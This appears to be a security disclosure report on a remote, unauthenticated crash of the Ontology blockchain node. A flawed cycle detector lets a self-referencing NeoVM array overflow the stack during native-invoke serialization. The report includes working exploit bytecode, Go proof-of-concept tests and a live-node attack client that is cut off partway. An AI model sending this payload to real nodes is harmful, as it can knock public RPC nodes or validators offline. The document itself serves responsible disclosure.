# Unbounded recursion in `Ontology.Native.Invoke` argument serialization (circular-reference detector blind spot) leads to remote, unauthenticated fatal node-process crash (Denial of Service / potential chain halt)

**Forward to:** research@ont.io
**Target:** `github.com/ontio/ontology` (Ontology full node, `ontology` binary)
**Affected checkout:** `1d2d81ebd56483ad4866479d48c818ece437ad6a` (`v3.0.0-1-g1d2d81eb`, current `HEAD` of `master`)
**Vulnerability class:** Denial of Service — uncontrolled recursion / stack exhaustion (CWE-674), reachable pre-authentication
**Component:** `vm/neovm/types/neovm_value.go` (circular-reference detector + native-argument serializer), reached via `smartcontract/service/neovm/native.go`
**Severity (self-assessed):** Critical (defensible floor: High — see *Impact Details → Honest severity boundaries*)
**Reproduced:** 2026-07-18, `go1.26.4`, locally, end-to-end against a live node

---

# Description

## Brief / Intro

The Ontology full node accepts a NeoVM transaction script that constructs a self-referential array shaped as `[false, self]` and passes it as the argument object to the `Ontology.Native.Invoke` system call. The circular-reference detector that is supposed to guard native-argument serialization (`CircularRefAndDepthDetection` in `vm/neovm/types/neovm_value.go`) only ever inspects the **first** child of arrays, structs, and maps, so a cycle hidden in a later child is not detected. The native-argument serializer `BuildParamToNative` then recurses into the self-reference indefinitely until the Go runtime aborts with `fatal error: stack overflow`. This path is reached during **transaction pre-execution**, which runs on the unauthenticated JSON-RPC `sendrawtransaction` handler — both on the explicit pre-exec branch (`params[1] == 1`) and on the default txpool submission branch — *before* signature verification, balance checks, or gas accounting can act as a gate. A 222-byte raw transaction from an anonymous, freshly generated, zero-balance signer deterministically kills the node process (exit code 2). Because it is a Go runtime `throw` (not an ordinary `panic`), the per-request `recover()` in the RPC handler does not contain it. In production this is a remote, unauthenticated, no-fee/no-balance deterministic kill of any reachable RPC node, and — if the payload ever reaches block validation — a consensus/chain-halt risk, since every validator processing the transaction crashes identically.

## Vulnerability Details

### Root cause: a detector with loop *syntax* but first-child *semantics*

Native-invoke arguments are serialized by `BuildParamToNative`, which first runs the circular-reference detector and only proceeds if the detector reports "no cycle":

```go
// vm/neovm/types/neovm_value.go:154-162
func (self *VmValue) BuildParamToNative(sink *common.ZeroCopySink) error {
	b, err := self.CircularRefAndDepthDetection()
	if err != nil {
		return err
	}
	if b {
		return fmt.Errorf("runtime serialize: can not serialize circular reference data")
	}
	return self.buildParamToNative(sink)
}
```

The serializer descends recursively, and for each array/struct child it calls the **public** `BuildParamToNative` method again — i.e. it re-runs the detector from scratch for every child:

```go
// vm/neovm/types/neovm_value.go:181-195
case arrayType:
	sink.WriteVarBytes(common.BigIntToNeoBytes(big.NewInt(int64(len(self.array.Data)))))
	for _, v := range self.array.Data {
		err := v.BuildParamToNative(sink)
		if err != nil {
			return err
		}
	}
case structType:
	for _, v := range self.structval.Data {
		err := v.BuildParamToNative(sink)
		if err != nil {
			return err
		}
	}
```

Each detector call allocates a **fresh** visited-set and starts at depth zero:

```go
// vm/neovm/types/neovm_value.go:485-486
func (self *VmValue) CircularRefAndDepthDetection() (bool, error) {
	return self.circularRefAndDepthDetection(make(map[uintptr]bool), 0)
}
```

A fresh visited-set per call would still be safe **if** each detector invocation walked the entire graph rooted at the current value. It does not. The array case records the backing-store pointer, then `return`s from **inside** the loop on the very first child:

```go
// vm/neovm/types/neovm_value.go:489-511
func (self *VmValue) circularRefAndDepthDetection(visited map[uintptr]bool, depth int) (bool, error) {
	if depth > MAX_STRUCT_DEPTH {
		return true, nil
	}
	switch self.valType {
	case arrayType:
		arr, err := self.AsArrayValue()
		if err != nil {
			return true, err
		}
		if len(arr.Data) == 0 {
			return false, nil
		}
		p := reflect.ValueOf(arr.Data).Pointer()
		if visited[p] {
			return true, nil
		}
		visited[p] = true
		for _, v := range arr.Data {
			return v.circularRefAndDepthDetection(visited, depth+1)   // <-- returns on child 0
		}
		delete(visited, p)     // unreachable for non-empty arrays
		return false, nil      // unreachable for non-empty arrays
```

The `return` is unconditionally inside the `for` body, so the loop executes exactly once and the function returns after examining **only child index 0**. The trailing `delete(visited, p)` and `return false, nil` are dead code for any non-empty container. The struct and map cases have the identical first-child early return:

```go
// vm/neovm/types/neovm_value.go:527-545 (struct + map)
for _, v := range s.Data {
	return v.circularRefAndDepthDetection(visited, depth+1)   // struct: child 0 only
}
...
for _, v := range mp.Data {
	return v[1].circularRefAndDepthDetection(visited, depth+1) // map: value half of entry 0 only; key half never checked
}
```

### Why `[false, self]` slips through and then recurses to death

1. The NeoVM script creates array `A`.
2. Appends `false` → `A = [false]`.
3. Appends `A` itself → `A = [false, A]` (a genuine in-memory pointer cycle; `APPEND` on an array item stores the reference with no clone).
4. Passes `A` as the `args` object to `Ontology.Native.Invoke`.

When `NativeInvoke` calls `args.BuildParamToNative`:

- The detector visits `A`, marks its backing store visited, inspects **child 0** (`false`, a primitive → `(false, nil)`), and returns "no cycle" — **child 1, the self-reference, is never examined.**
- `buildParamToNative` writes the array length, serializes child 0 (`false`) fine, then reaches child 1 (`A` again) and calls the **public** `BuildParamToNative` on it.
- That fresh call gets a brand-new visited-set at depth 0, again checks only child 0, again misses the cycle, and again recurses into child 1.
- This repeats until the goroutine stack exceeds the runtime limit and Go executes `fatal error: stack overflow`, aborting the whole process.

### Where it is reached (pre-authentication)

`NativeInvoke` serializes `args` **before** it ever calls the native contract, so no native method, authorization check, or store access is required to reach the crash:

```go
// smartcontract/service/neovm/native.go:30-82 (excerpt)
func NativeInvoke(service *NeoVmService, engine *vm.Executor) error {
	version, err := engine.EvalStack.PopAsInt64()
	...
	method, err := engine.EvalStack.PopAsBytes()
	...
	args, err := engine.EvalStack.Pop()
	if err != nil {
		return err
	}
	sink := new(common.ZeroCopySink)
	if err := args.BuildParamToNative(sink); err != nil {   // <-- line 55: crash happens here
		return err
	}
	...
	result, err := nat.Invoke()   // native method never reached
	...
}
```

`Ontology.Native.Invoke` is unconditionally registered in the global service map (`smartcontract/service/neovm/neovm_service.go:90-95`, `NATIVE_INVOKE_NAME: NativeInvoke`), and `SystemCall` charges the single fixed `NATIVE_INVOKE_GAS = 1000` cost **once** before the handler runs — the recursive serialization that follows is ordinary Go code, not metered per-edge (`smartcontract/service/neovm/neovm_service.go:252-279`).

Two unauthenticated public routes reach this during pre-execution:

- **Explicit pre-exec** — `sendrawtransaction` with `params[1] == 1` calls `PreExecuteContract` directly (`http/jsonrpc/interfaces.go:283-292`).
- **Default txpool submission** — without the flag, `SendRawTransaction → SendTxToPool → AppendTxToPool` runs a synchronous `PreExecuteContract` **before** appending to the pool (`http/base/actor/txnpool.go:45-56`), and in the txpool actor `preExecCheck` runs **before** `startTxVerify` (which is where stateless signature validation is submitted) — `txnpool/proc/txnpool_actor.go:196-205`.

During pre-execution the VM is granted near-`MaxUint64` gas and `PreExec: true` (`core/store/ledgerstore/ledger_store.go:1293-1305`, `Gas: math.MaxUint64 - calcGasByCodeLen(...)`), so gas is not a limiting factor.

### The neighboring safe path (proves this is native-serializer-specific)

`System.Runtime.Serialize` (`Serialize`) shares the same broken detector but adds a sink-size cap after each step:

```go
// vm/neovm/types/neovm_value.go:479-480
if sink.Size() > constants.MAX_BYTEARRAY_SIZE {
	return fmt.Errorf("runtime serialize: can not serialize length over the uplimit")
}
```

The native bridge serializer has **no** such cap, which is why the identical cyclic object is a bounded, survivable smart-contract error on the `Serialize` path but a fatal process kill on the native-invoke path. This makes the runtime-serialize path an ideal control (it survives) and isolates the defect to the uncapped native serializer.

---

## Impact Details

**Primary impact:** remote, unauthenticated, no-fee/no-balance, deterministic, **unrecoverable** crash of the full-node process (availability). A single 222-byte raw transaction terminates the target node (process exit code 2).

Every mitigating precondition one might expect is absent, and each was refuted by fresh execution (see Proof of Concept):

| Assumed precondition | Reality (freshly executed) |
| --- | --- |
| Requires authentication | No — crash frame runs on a `net/http` handler goroutine under `rpc.(*ServeMux).ServeHTTP` (`rpc.go:111`) with no credentials. |
| Requires privilege / admin gating | No — crash is at `native.go:55`, **before** `nat.Invoke()`; no native method, auth check, or store access runs. |
| Requires funds / gas | No — signer is a freshly generated **zero-balance** account, `GasPrice=0`; pre-exec grants near-`MaxUint64` gas. |
| Requires a valid signature | No — pre-exec performs no signature check, and in the txpool path pre-exec precedes `startTxVerify`. |
| Requires non-default config | No — reproduced on default single-node config via both `sendrawtransaction` pre-exec and the default txpool route. |
| `recover()` contains it | No — it is a Go runtime **throw** (stack overflow), not a `panic`; the deferred `recover()` never fires; the process exits with code 2. |
| "Any cyclic array errors safely" | No — only the uncapped native path is fatal; the identical `[false, self]` on `System.Runtime.Serialize` returns a bounded error and the node survives. |

**Scale of loss:**

- Any Ontology full node exposing JSON-RPC (`sendrawtransaction`) can be crashed by an anonymous request. The attacker needs no funded account, no accepted transaction fee, no successful signature validation on the pre-exec path, and no special configuration.
- The payload is small enough for ordinary transaction transport. Any transaction propagation path that runs the same default pre-exec before rejecting the transaction can hit the same fatal sink.
- **Consensus/chain-halt escalation:** if the malicious transaction ever reaches block validation (execution during consensus), every validator that processes that block crashes identically on it. That is a chain-halt condition for a public blockchain, which is why the self-assessed severity is Critical.

**Honest severity boundaries (stated plainly, not papered over):**

- *Tempering it:* This is **availability-only**. Go aborts cleanly on stack overflow — there is no memory corruption and no path to RCE demonstrated. It is also self-limiting per victim: a crashed node dies before relaying the transaction, so it is "crash each endpoint you target," not a self-propagating worm. If one assumes consensus-node RPC is firewalled and weights "must target each endpoint individually" heavily, a defensible severity **floor is High**.
- *Amplifying it:* Default transaction admission pre-exec and the conditional block-validation/chain-halt vector push it to **Critical** for a public blockchain. The bug is **actively present at `HEAD` (`1d2d81eb`)**.

**Net:** Critical, floor High.

## References

- Vulnerable detector + serializer: `vm/neovm/types/neovm_value.go`
  - `BuildParamToNative` — lines 154-162 (public entry) and 181-195 (recursive array/struct descent)
  - `CircularRefAndDepthDetection` / `circularRefAndDepthDetection` — lines 485-486, 489-511 (array first-child early return), 527-545 (struct + map first-child early return)
  - `Serialize` sink cap (the safe control) — lines 479-480
- Native-invoke bridge (crash site): `smartcontract/service/neovm/native.go:30-82` (crash at `:55`)
- Syscall dispatch + registration + gas: `smartcontract/service/neovm/neovm_service.go:90-95, 183, 252-279`; `smartcontract/service/neovm/config.go:38, 165`
- Explicit pre-exec RPC route: `http/jsonrpc/interfaces.go:283-292`
- Default txpool route: `http/jsonrpc/interfaces.go:295-299`; `http/base/actor/txnpool.go:45-56`; `http/base/common/common.go:284`
- Txpool ordering (pre-exec before signature verify): `txnpool/proc/txnpool_actor.go:196-205`; `txnpool/proc/txnpool_server.go:245-246`; `validator/stateless/stateless_validator.go:37-40`; `core/validation/transaction_validator.go:37-49`
- Pre-exec gas grant: `core/store/ledgerstore/ledger_store.go:1293-1305, 1309`
- Unauthenticated HTTP handler: `http/base/rpc/rpc.go:111`

---

# Proof of Concept

The proof material below was captured **locally on 2026-07-18** against checkout `1d2d81eb` with `go1.26.4`. Raw artifacts are archived alongside this report under `fresh-evidence/`. Five independent proofs are presented, escalating from the isolated detector to a live end-to-end node kill, plus a surviving control.

**Build note (Apple Silicon).** The host is `arm64`, but the bundled `smartcontract/service/wasmvm/libwasmjit_onto_interface_darwin.a` is an `x86_64` archive. Any binary that links `smartcontract` (the node and the pre-exec entrypoint test) was built with `CGO_ENABLED=1 GOARCH=amd64 GOOS=darwin CC="clang -arch x86_64"` and run under Rosetta. The pure-VM proofs (1, 2, 3) need no CGO and ran natively on `arm64`. The crash reproduces on both architectures.

**Safety.** Send tests only against disposable local/regtest nodes. `--mode=native` is expected to kill a vulnerable node process — never run it against public mainnet infrastructure or any node you are not authorized to crash.

---

## Proof 1 — Detector blind spot (native arm64, no CGO)

`vm/neovm/types/freshproof_test.go` builds the exact malicious shape `[false, self]` and the control `[self]`, then calls the production detector directly. The malicious shape must (buggily) report **no cycle**; the control must correctly report a cycle.

**Test source (`vm/neovm/types/freshproof_test.go`, in full):**

```go
package types

import (
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"testing"

	"github.com/ontio/ontology/common"
)

// buildFalseSelfArray builds the exact malicious PoC shape: A = [false, A].
// A safe primitive sits at index 0; the self-reference is a LATER child.
func buildFalseSelfArray() VmValue {
	arr := NewArrayValue()
	if err := arr.Append(VmValueFromBool(false)); err != nil {
		panic(err)
	}
	self := VmValueFromArrayVal(arr)
	if err := arr.Append(self); err != nil { // arr.Data = [false, self]
		panic(err)
	}
	return self
}

// buildSelfAtZeroArray builds A = [A] — cycle at the FIRST child (what the
// existing test suite already covers).
func buildSelfAtZeroArray() VmValue {
	arr := NewArrayValue()
	self := VmValueFromArrayVal(arr)
	if err := arr.Append(self); err != nil { // arr.Data = [self]
		panic(err)
	}
	return self
}

// PROOF 1: the detector MISSES the later-child cycle but CATCHES the child-0
// cycle. This is the blind spot, executed directly.
func TestFreshProof_DetectorBlindSpot(t *testing.T) {
	// malicious [false, self]: detector must (buggily) report NO cycle
	mal := buildFalseSelfArray()
	got, err := mal.CircularRefAndDepthDetection()
	if err != nil {
		t.Fatalf("unexpected err: %v", err)
	}
	if got != false {
		t.Fatalf("detector caught the later-child cycle (bug would be fixed); got=%v", got)
	}
	t.Logf("[false, self]  -> detector reports cycle = %v  (BLIND SPOT: cycle missed)", got)

	// control [self]: detector correctly reports a cycle
	ctrl := buildSelfAtZeroArray()
	gotCtrl, err := ctrl.CircularRefAndDepthDetection()
	if err != nil {
		t.Fatalf("unexpected err: %v", err)
	}
	if gotCtrl != true {
		t.Fatalf("detector missed the child-0 cycle too; got=%v", gotCtrl)
	}
	t.Logf("[self]         -> detector reports cycle = %v  (control: caught)", gotCtrl)
}

// PROOF 2 + 3: BuildParamToNative on [false, self] dies with a real, fresh
// `fatal error: stack overflow`, and a deferred recover() CANNOT save it.
// The crash runs in a re-exec'd child; the parent asserts on its output.
func TestFreshProof_NativeSerializeStackOverflow(t *testing.T) {
	if os.Getenv("FRESHPROOF_CRASH_CHILD") == "1" {
		// This deferred recover proves the throw is UNRECOVERABLE. For an
		// ordinary panic we would print RECOVERED and exit 0; for a runtime
		// stack-overflow throw we never get here — the process just dies.
		defer func() {
			if r := recover(); r != nil {
				fmt.Fprintf(os.Stderr, "RECOVERED=%v\n", r)
				os.Exit(0)
			}
		}()

		self := buildFalseSelfArray()
		reportsCycle, _ := self.CircularRefAndDepthDetection()
		fmt.Fprintf(os.Stderr, "child_detector_reports_cycle=%v\n", reportsCycle)

		sink := common.NewZeroCopySink(nil)
		fmt.Fprintln(os.Stderr, "child_calling_BuildParamToNative")
		_ = self.BuildParamToNative(sink) // <- fatal error: stack overflow
		fmt.Fprintln(os.Stderr, "NO_CRASH_returned_normally")
		os.Exit(0)
	}

	cmd := exec.Command(os.Args[0], "-test.run=TestFreshProof_NativeSerializeStackOverflow", "-test.v")
	cmd.Env = append(os.Environ(), "FRESHPROOF_CRASH_CHILD=1")
	out, _ := cmd.CombinedOutput()
	t.Logf("=== child process output (truncated) ===\n%s", head(out, 1800))

	if bytes.Contains(out, []byte("RECOVERED=")) {
		t.Fatalf("recover() caught it -> would NOT be a fatal node kill")
	}
	if bytes.Contains(out, []byte("NO_CRASH_returned_normally")) {
		t.Fatalf("BuildParamToNative returned normally -> no crash")
	}
	if !bytes.Contains(out, []byte("fatal error: stack overflow")) {
		t.Fatalf("expected `fatal error: stack overflow`, did not find it")
	}
	if !bytes.Contains(out, []byte("child_detector_reports_cycle=false")) {
		t.Fatalf("expected detector to report NO cycle in child")
	}
	t.Log("CONFIRMED: fatal error: stack overflow, not recovered, detector reported no cycle")
}

func head(b []byte, n int) []byte {
	if len(b) <= n {
		return b
	}
	return b[:n]
}
```

**Command and output:**

```text
$ go test ./vm/neovm/types/ -run TestFreshProof_DetectorBlindSpot -v
=== RUN   TestFreshProof_DetectorBlindSpot
    freshproof_test.go:50: [false, self]  -> detector reports cycle = false  (BLIND SPOT: cycle missed)
    freshproof_test.go:61: [self]         -> detector reports cycle = true  (control: caught)
--- PASS: TestFreshProof_DetectorBlindSpot (0.00s)
```

---

## Proof 2 — Unrecoverable fatal crash; `recover()` does not fire (native arm64, no CGO)

The same file (`TestFreshProof_NativeSerializeStackOverflow`, source above) calls `BuildParamToNative([false, self])` inside a re-exec'd child that has a deferred `recover()`. An ordinary `panic` would print `RECOVERED=` and exit 0; a runtime stack-overflow `throw` bypasses `recover()` entirely and the process dies.

```text
$ go test ./vm/neovm/types/ -run TestFreshProof_NativeSerializeStackOverflow -v
=== RUN   TestFreshProof_NativeSerializeStackOverflow
    freshproof_test.go:93: === child process output (truncated) ===
        child_detector_reports_cycle=false
        child_calling_BuildParamToNative
        runtime: goroutine stack exceeds 1000000000-byte limit
        fatal error: stack overflow
          ...neovm_value.go:489 circularRefAndDepthDetection
          ...neovm_value.go:155 BuildParamToNative
          ...neovm_value.go:184 buildParamToNative        (infinite)
    freshproof_test.go:107: CONFIRMED: fatal error: stack overflow, not recovered, detector reported no cycle
--- PASS: TestFreshProof_NativeSerializeStackOverflow (0.61s)
```

Key facts asserted by the test harness: no `RECOVERED=` appears (recover did not fire), no `NO_CRASH_returned_normally` appears (it did crash), `fatal error: stack overflow` is present, and the detector reported `cycle=false` in the crashing child.

---

## Proof 3 — The real production VM builds the cycle from attacker bytecode (native arm64, no CGO)

`vm/neovm/freshproof_cycle_test.go` runs the exact opcode fragment an attacker embeds in `InvokeCode` (`PUSH1 NEWARRAY DUP DUP APPEND`) through the **production** `neovm.Executor`, then inspects the result: the outer array and its index-1 element are the **same pointer** (a genuine cycle, not a copy), and the production detector is blind to it.

**Test source (`vm/neovm/freshproof_cycle_test.go`, in full):**

```go
package neovm

import (
	"testing"

	"github.com/ontio/ontology/vm/neovm/types"
)

// exploitArrayBytecode is the exact NeoVM opcode fragment an attacker places in a
// transaction's InvokeCode to build the malicious argument A = [false, A]:
//
//	PUSH1 NEWARRAY   -> A = [false]         (a PRIMITIVE sits at index 0)
//	DUP DUP APPEND   -> A = [false, A]      (self-reference at index 1)
//
// APPEND on an ArrayType item stores the reference with no clone
// (executor.go APPEND case), so this is a genuine in-memory cycle.
func exploitArrayBytecode() []byte {
	return []byte{
		byte(PUSH1),
		byte(NEWARRAY),
		byte(DUP),
		byte(DUP),
		byte(APPEND),
	}
}

// PROOF (reachability, native arm64): the REAL production VM interpreter, fed
// pure attacker-controlled bytecode, produces a pointer-identical cyclic array
// that the circular-reference detector fails to flag.
func TestFreshProof_VMBuildsCycleFromBytecode(t *testing.T) {
	exec := NewExecutor(exploitArrayBytecode(), VmFeatureFlag{})
	if err := exec.Execute(); err != nil {
		t.Fatalf("VM rejected attacker bytecode: %v", err)
	}
	if exec.EvalStack.Count() != 1 {
		t.Fatalf("expected exactly 1 value on eval stack, got %d", exec.EvalStack.Count())
	}
	top, err := exec.EvalStack.Pop()
	if err != nil {
		t.Fatal(err)
	}
	if top.GetType() != types.ArrayType {
		t.Fatalf("top of stack is not an array (type=0x%x)", top.GetType())
	}
	outer, err := top.AsArrayValue()
	if err != nil {
		t.Fatal(err)
	}
	if len(outer.Data) != 2 {
		t.Fatalf("expected array length 2 ([false, self]), got %d", len(outer.Data))
	}
	if outer.Data[1].GetType() != types.ArrayType {
		t.Fatalf("index 1 is not an array (type=0x%x)", outer.Data[1].GetType())
	}
	inner, err := outer.Data[1].AsArrayValue()
	if err != nil {
		t.Fatal(err)
	}
	// Pointer identity == a real cycle, not a copy.
	if inner != outer {
		t.Fatalf("index 1 is a distinct array (%p != %p) -> not a real cycle", inner, outer)
	}
	t.Logf("VM built A=[false, A] from bytecode: &A=%p, &A.Data[1]=%p -> pointer-identical CYCLE", outer, inner)

	// The production detector is blind to it (self-reference is a LATER child).
	reportsCycle, err := top.CircularRefAndDepthDetection()
	if err != nil {
		t.Fatal(err)
	}
	if reportsCycle {
		t.Fatal("detector flagged the VM-built cycle (would mean the bug is fixed); got true")
	}
	t.Log("CircularRefAndDepthDetection on the VM-produced value -> false (BLIND SPOT on real-VM value)")
}
```

**Command and output:**

```text
$ go test ./vm/neovm/ -run TestFreshProof_VMBuildsCycleFromBytecode -v
=== RUN   TestFreshProof_VMBuildsCycleFromBytecode
    freshproof_cycle_test.go:63: VM built A=[false, A] from bytecode: &A=0x5edcc6e9a390, &A.Data[1]=0x5edcc6e9a390 -> pointer-identical CYCLE
    freshproof_cycle_test.go:73: CircularRefAndDepthDetection on the VM-produced value -> false (BLIND SPOT on real-VM value)
--- PASS: TestFreshProof_VMBuildsCycleFromBytecode (0.00s)
```

`&A == &A.Data[1]` — an identical pointer confirms a real cycle produced by the real interpreter, which the detector then misses.

---

## Proof 4 — The exact pre-execution entrypoint dies (amd64 / Rosetta)

`smartcontract/test/freshproof_reachability_test.go` builds the smart-contract engine **exactly** as `core/store/ledgerstore.PreExecuteContractWithParam` does for an `InvokeNeo` transaction — full gas table, `PreExec: true`, node-granted near-`MaxUint64` gas — and invokes the attacker's `InvokeCode` through the real `SYSCALL Ontology.Native.Invoke` dispatch. This is the same call `sendrawtransaction(..., preExec=1)` reaches with no auth, no signature check, and no attacker-supplied gas.

**Test source (`smartcontract/test/freshproof_reachability_test.go`, in full):**

```go
package test

import (
	"bytes"
	"fmt"
	"math"
	"os"
	"os/exec"
	"testing"

	"github.com/ontio/ontology/core/types"
	"github.com/ontio/ontology/smartcontract"
	neovmsvc "github.com/ontio/ontology/smartcontract/service/neovm"
	"github.com/ontio/ontology/vm/neovm"
)

// exploitInvokeCode is the full InvokeCode payload an unauthenticated attacker
// puts in a raw transaction. It builds the malicious native-invoke argument
// A = [false, A] and calls the native bridge:
//
//	PUSH1 NEWARRAY DUP DUP APPEND     -> args = [false, A]  (self-ref at index 1)
//	PUSHBYTES <method>                -> method  (popped 3rd, must be <=1024)
//	PUSHBYTES20 <20 zero bytes>       -> address (popped 2nd, must parse)
//	PUSH0                             -> version (popped 1st)
//	SYSCALL "Ontology.Native.Invoke"  -> NativeInvoke pops the above, then calls
//	                                     args.BuildParamToNative(sink) -> overflow
func exploitInvokeCode() []byte {
	var s []byte
	// args = [false, self]
	s = append(s, byte(neovm.PUSH1), byte(neovm.NEWARRAY), byte(neovm.DUP), byte(neovm.DUP), byte(neovm.APPEND))
	// method bytes (any non-empty, <= METHOD_LENGTH_LIMIT)
	method := []byte("transfer")
	s = append(s, byte(len(method)))
	s = append(s, method...)
	// contract address: exactly 20 bytes so AddressParseFromBytes succeeds
	addr := make([]byte, 20)
	s = append(s, byte(20))
	s = append(s, addr...)
	// version int
	s = append(s, byte(neovm.PUSH0))
	// SYSCALL "Ontology.Native.Invoke" (len 22 < 0xFD -> single-byte varint prefix)
	name := []byte(neovmsvc.NATIVE_INVOKE_NAME)
	s = append(s, byte(neovm.SYSCALL), byte(len(name)))
	s = append(s, name...)
	return s
}

// PROOF (reachability, the real pre-exec entrypoint): building the engine EXACTLY
// as core/store/ledgerstore.PreExecuteContractWithParam does for an InvokeNeo tx
// -- full gas table, PreExec=true, node-granted near-MaxUint64 gas -- and invoking
// it on the attacker's InvokeCode dies with an unrecoverable stack overflow. This
// is the same call sendrawtransaction(..., preExec=1) reaches with NO auth, NO
// signature check, and NO attacker-supplied gas/funds.
//
// The crash is a runtime throw that kills the process, so it runs in a re-exec'd
// child; the parent asserts on the child's output.
func TestFreshProof_PreExecPathStackOverflow(t *testing.T) {
	if os.Getenv("FRESHPROOF_PREEXEC_CHILD") == "1" {
		runPreExecCrashChild()
		return
	}

	cmd := exec.Command(os.Args[0], "-test.run=TestFreshProof_PreExecPathStackOverflow", "-test.v")
	cmd.Env = append(os.Environ(), "FRESHPROOF_PREEXEC_CHILD=1")
	out, _ := cmd.CombinedOutput()
	t.Logf("=== child (real pre-exec path) output (truncated) ===\n%s", headBytes(out, 2200))

	if bytes.Contains(out, []byte("RECOVERED=")) {
		t.Fatal("recover() caught it -> would NOT be a fatal node kill")
	}
	if bytes.Contains(out, []byte("NO_CRASH_returned_normally")) {
		t.Fatal("engine.Invoke() returned normally -> no crash")
	}
	if bytes.Contains(out, []byte("ENGINE_ERR=")) {
		t.Fatal("engine construction failed -> test setup wrong, not a real crash")
	}
	if !bytes.Contains(out, []byte("fatal error: stack overflow")) {
		t.Fatal("expected `fatal error: stack overflow` from the pre-exec path, not found")
	}
	t.Log("CONFIRMED: SmartContract.NewExecuteEngine(exploit, InvokeNeo).Invoke() -> fatal error: stack overflow")
	t.Log("This is the exact call PreExecuteContractWithParam runs for sendrawtransaction(preExec=1).")
}

func runPreExecCrashChild() {
	// If this were an ordinary panic, recover() would print RECOVERED and exit 0.
	// A runtime stack-overflow throw bypasses recover entirely: the process dies.
	defer func() {
		if r := recover(); r != nil {
			fmt.Fprintf(os.Stderr, "RECOVERED=%v\n", r)
			os.Exit(0)
		}
	}()

	code := exploitInvokeCode()
	fmt.Fprintf(os.Stderr, "child_invokecode_len=%d\n", len(code))

	// Mirror LedgerStoreImp.PreExecuteContractWithParam exactly.
	gasTable := make(map[string]uint64)
	neovmsvc.GAS_TABLE.Range(func(k, value interface{}) bool {
		gasTable[k.(string)] = value.(uint64)
		return true
	})
	config := &smartcontract.Config{
		Time:   10,
		Height: 100000000,
		Tx:     &types.Transaction{},
	}
	sc := smartcontract.SmartContract{
		Config:   config,
		GasTable: gasTable,
		Gas:      math.MaxUint64 - 100000, // node grants near-max gas during pre-exec
		CacheDB:  nil,
		PreExec:  true,
	}
	engine, err := sc.NewExecuteEngine(code, types.InvokeNeo)
	if err != nil {
		fmt.Fprintf(os.Stderr, "ENGINE_ERR=%v\n", err)
		os.Exit(0)
	}
	fmt.Fprintln(os.Stderr, "child_calling_engine.Invoke")
	_, _ = engine.Invoke() // <- fatal error: stack overflow (NativeInvoke -> BuildParamToNative)
	fmt.Fprintln(os.Stderr, "NO_CRASH_returned_normally")
	os.Exit(0)
}

func headBytes(b []byte, n int) []byte {
	if len(b) <= n {
		return b
	}
	return b[:n]
}
```

**Command and output (amd64 under Rosetta):**

```text
$ arch -x86_64 sctest_amd64.bin -test.run TestFreshProof_PreExecPathStackOverflow -test.v
=== RUN   TestFreshProof_PreExecPathStackOverflow
    freshproof_reachability_test.go:66: === child (real pre-exec path) output (truncated) ===
        child_invokecode_len=60
        child_calling_engine.Invoke
        runtime: goroutine stack exceeds 1000000000-byte limit
        fatal error: stack overflow
        github.com/ontio/ontology/vm/neovm/types.(*VmValue).circularRefAndDepthDetection(0x833e3af0580?, 0x833e3af06f8?, 0x1?)
        github.com/ontio/ontology/vm/neovm/types.(*VmValue).circularRefAndDepthDetection(0x0?, 0x833e3af06f8, 0x0)
        github.com/ontio/ontology/vm/neovm/types.(*VmValue).CircularRefAndDepthDetection(...)
        github.com/ontio/ontology/vm/neovm/types.(*VmValue).BuildParamToNative(0x833cdb69aa0, 0x83403aef1b0)
        github.com/ontio/ontology/vm/neovm/types.(*VmValue).buildParamToNative(0x833cdb699e0, 0x83403aef1b0)
        github.com/ontio/ontology/vm/neovm/types.(*VmValue).BuildParamToNative(0x833cdb699e0, 0x83403aef1b0)
        github.com/ontio/ontology/vm/neovm/types.(*VmValue).buildParamToNative(0x833cdb69920, 0x83403aef1b0)
    freshproof_reachability_test.go:80: CONFIRMED: SmartContract.NewExecuteEngine(exploit, InvokeNeo).Invoke() -> fatal error: stack overflow
    freshproof_reachability_test.go:81: This is the exact call PreExecuteContractWithParam runs for sendrawtransaction(preExec=1).
--- PASS: TestFreshProof_PreExecPathStackOverflow (1.19s)
```

---

## Proof 5 — Live end-to-end node kill (amd64 / Rosetta)

A disposable single-node instance was started (`--testmode`, solo consensus, JSON-RPC on `127.0.0.1:20336`, gas price 0) and confirmed producing blocks. Then the PoC below sent (a) a surviving control to `System.Runtime.Serialize`, and (b) the fatal payload to `Ontology.Native.Invoke` on both the explicit pre-exec route and the default txpool route. Full logs: `fresh-evidence/live-node.log`, `fresh-evidence/live-node-txpool-path.log`; crash excerpts: `fresh-evidence/live-crash-excerpt.txt`, `fresh-evidence/live-crash-txpool-excerpt.txt`.

**PoC source (`poc/main.go`, in full):**

```go
package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"os"
	"time"

	"github.com/ontio/ontology-crypto/keypair"
	"github.com/ontio/ontology/account"
	"github.com/ontio/ontology/common"
	"github.com/ontio/ontology/core/payload"
	"github.com/ontio/ontology/core/signature"
	"github.com/ontio/ontology/core/types"
	"github.com/ontio/ontology/vm/neovm"
)

const (
	nativeInvokeName     = "Ontology.Native.Invoke"
	runtimeSerializeName = "System.Runtime.Serialize"
)

var ontIDContractAddress = []byte{
	0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x03,
}

type rpcRequest struct {
	JSONRPC string        `json:"jsonrpc"`
	Method  string        `json:"method"`
	Params  []interface{} `json:"params"`
	ID      int           `json:"id"`
}

type rpcResponse struct {
	JSONRPC string          `json:"jsonrpc"`
	Error   int64           `json:"error"`
	Desc    string          `json:"desc"`
	Result  json.RawMessage `json:"result"`
	ID      int             `json:"id"`
}

func emitCyclicArray(builder *neovm.ParamsBuilder) {
	builder.EmitPushInteger(big.NewInt(0))
	builder.Emit(neovm.NEWARRAY)        // A
	builder.Emit(neovm.DUP)             // A, A
	builder.Emit(neovm.TOALTSTACK)      // A ; alt A
	builder.EmitPushBool(false)         // A, false
	builder.Emit(neovm.APPEND)          // A = [false]
	builder.Emit(neovm.DUPFROMALTSTACK) // A
	builder.Emit(neovm.DUPFROMALTSTACK) // A, A
	builder.Emit(neovm.APPEND)          // A = [false, A]
}

func buildCycleCode(mode string) []byte {
	builder := neovm.NewParamsBuilder(new(bytes.Buffer))
	emitCyclicArray(builder)
	builder.Emit(neovm.DUPFROMALTSTACK)

	switch mode {
	case "native":
